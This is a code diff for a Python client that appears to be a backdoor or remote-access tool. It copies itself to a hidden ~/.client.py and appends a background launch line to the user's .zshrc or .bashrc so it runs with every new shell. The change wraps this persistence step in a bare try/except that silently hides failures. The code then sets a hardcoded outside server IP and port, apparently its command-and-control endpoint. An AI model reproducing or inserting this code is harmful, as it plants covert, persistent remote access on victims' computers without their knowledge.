@@ -5,30 +5,32 @@ from time import sleep
 '''
 First, make this script start every time the user starts their computer, or a new shell. (If they are running linux)
 '''
-#If they use zshrc, set that to the rcFile to edit
-if os.path.exists(f"{os.path.expanduser('~')}/.zshrc"):
-    rcFile = ".zshrc"
-    NO_PERSISTENCE = False
-#if they don't use zshrc, see if they use bashrc
-elif os.path.exists(f"{os.path.expanduser('~')}/.bashrc"):
-    rcFile = ".bashrc"
-    NO_PERSISTENCE = False
-else:
-    NO_PERSISTENCE = True
-
-#Open their rc file and check if our persistence is already there. If it is, skip this step. If it isn't, make it persistent.
-with open(f"{os.path.expanduser('~')}/{rcFile}","r",) as file:
-    if f"python3 {os.path.expanduser('~')}/.client.py &\n" not in file:
-        MAKE_PERSISTENT = True
+try:
+    #If they use zshrc, set that to the rcFile to edit
+    if os.path.exists(f"{os.path.expanduser('~')}/.zshrc"):
+        rcFile = ".zshrc"
+        NO_PERSISTENCE = False
+    #if they don't use zshrc, see if they use bashrc
+    elif os.path.exists(f"{os.path.expanduser('~')}/.bashrc"):
+        rcFile = ".bashrc"
+        NO_PERSISTENCE = False
     else:
-        MAKE_PERSISTENT = False
+        NO_PERSISTENCE = True
 
-#If we want to make it persistent and a file to edit exists, do it.
-if MAKE_PERSISTENT and not NO_PERSISTENCE: 
-    subprocess.run(f"cp client.py {os.path.expanduser('~')}/.client.py",shell=True) #Copy the client to their home dir and make it .client.py
-    with open(f"{os.path.expanduser('~')}/{rcFile}","a",) as file:
-        file.write(f"python3 {os.path.expanduser('~')}/.client.py &\n")
+    #Open their rc file and check if our persistence is already there. If it is, skip this step. If it isn't, make it persistent.
+    with open(f"{os.path.expanduser('~')}/{rcFile}","r",) as file:
+        if f"python3 {os.path.expanduser('~')}/.client.py &\n" not in file:
+            MAKE_PERSISTENT = True
+        else:
+            MAKE_PERSISTENT = False
 
+    #If we want to make it persistent and a file to edit exists, do it.
+    if MAKE_PERSISTENT and not NO_PERSISTENCE: 
+        subprocess.run(f"cp client.py {os.path.expanduser('~')}/.client.py",shell=True) #Copy the client to their home dir and make it .client.py
+        with open(f"{os.path.expanduser('~')}/{rcFile}","a",) as file:
+            file.write(f"python3 {os.path.expanduser('~')}/.client.py &\n")
+except:
+    pass
 
 SERVER_HOST = "129.21.84.60" #DEFAULT SERVER HOST
 SERVER_PORT = 8080 #DEFAULT SERVER PORT
